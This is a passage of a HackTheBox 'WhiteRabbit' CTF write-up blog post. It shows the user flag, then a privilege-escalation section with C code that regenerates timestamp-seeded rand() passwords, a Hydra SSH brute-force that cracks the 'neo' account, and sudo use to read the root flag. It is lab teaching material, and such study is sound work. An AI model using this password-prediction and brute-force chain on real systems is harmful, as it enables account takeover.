class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This system has been minimized by removing packages and content that are</span></span><br><span class="line"><span class="string">not required on a system that users do not log into.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To restore this content, you can run the &#x27;</span>unminimize<span class="string">&#x27; command.</span></span><br><span class="line"><span class="string">Last login: Mon Apr 7 17:21:46 2025 from 10.10.16.19</span></span><br><span class="line"><span class="string">morpheus@whiterabbit:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">morpheus@whiterabbit:~$ cat user.txt </span></span><br><span class="line"><span class="string">e61f4c0399c6bc0042392cdeaea91c80</span></span><br><span class="line"><span class="string">morpheus@whiterabbit:~$ exit</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Now from the dumped command log I noticed <code>/opt/neo-password-generator</code> being used right before a passwd call, so I recreated the binary logic locally and saw it was just generating passwords using <code>rand()</code> seeded with a fixed timestamp. By hardcoding that exact time and bruteforcing the 1000 possible millisecond offsets, I generated the same password list, fed it to Hydra, and quickly logged in as neo over SSH. Since neo is in the sudo group, got root and the root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">morpheus@whiterabbit:/opt/neo-password-generator$ <span class="built_in">ls</span></span><br><span class="line">neo-password-generator</span><br><span class="line">morpheus@whiterabbit:/opt/neo-password-generator$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$  <span class="built_in">cat</span> generator.c </span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;time.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">  char cs[]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>, <span class="built_in">pwd</span>[21];</span><br><span class="line">  struct tm tm = &#123; .tm_year = 2024-1900, .tm_mon = 8-1, .tm_mday = 30, .tm_hour = 14, .tm_min = 40, .tm_sec = 42 &#125;;</span><br><span class="line">  time_t t = timegm(&amp;tm);</span><br><span class="line">  <span class="keyword">for</span>(int ms = 0; ms &lt; 1000; ms++)&#123;</span><br><span class="line">    srand(t * 1000 + ms);</span><br><span class="line">    <span class="keyword">for</span>(int i = 0; i &lt; 20; i++) <span class="built_in">pwd</span>[i] = cs[rand() % 62];</span><br><span class="line">    <span class="built_in">pwd</span>[20] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="built_in">pwd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">                                                                                     </span><br><span class="line">$ gcc generator.c -o generator</span><br><span class="line"></span><br><span class="line">                                                                                     </span><br><span class="line">$ ./generator &gt; passwords</span><br><span class="line">                                                                                     </span><br><span class="line">$ hydra -l neo -P passwords -t 16 ssh://whiterabbit.htb</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-07 13:30:39</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task</span><br><span class="line">[DATA] attacking ssh://whiterabbit.htb:22/</span><br><span class="line">[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 1 final worker threads did not complete <span class="keyword">until</span> end.</span><br><span class="line">[ERROR] 1 target did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-07 13:30:50</span><br><span class="line">                        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">neo@whiterabbit:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(neo) gid=1000(neo) <span class="built_in">groups</span>=1000(neo),27(sudo)</span><br><span class="line">neo@whiterabbit:~$ sudo su</span><br><span class="line">[sudo] password <span class="keyword">for</span> neo: </span><br><span class="line">root@whiterabbit:/home/neo<span class="comment"># cat /root/root.txt </span></span><br><span class="line">e410b4dbbc359f900caf510fa488c2ce</span><br><span class="line">root@whiterabbit:/home/neo<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for whiterabbit, hope you enjoyed!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: WhiteRabbit</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-12-13 18:27:16</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-12-13 21:30:42
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/12/13/Hackthebox-WhiteRabbit/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/12/10/Damn-Vulnerable-DeFi-V4-Unstoppable/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Damn Vulnerable DeFi V4: Unstoppable</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: WhiteRabbit</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-http-whiterabbit-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;whiterabbit.htb&#x2F; </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
